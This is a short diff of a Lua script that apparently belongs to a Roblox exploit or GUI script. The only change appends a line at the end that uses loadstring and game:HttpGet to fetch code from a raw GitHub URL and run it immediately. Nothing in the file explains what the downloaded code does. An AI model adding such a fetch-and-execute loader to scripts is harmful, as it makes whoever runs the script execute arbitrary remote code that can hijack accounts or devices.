@@ -497,3 +497,4 @@ local function DYQYL_fake_script() -- Delete.LocalScript
 	end)
 end
 coroutine.wrap(DYQYL_fake_script)()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ooaoaoaoaaooaoa/OPSCRIPT/main/Main"))();
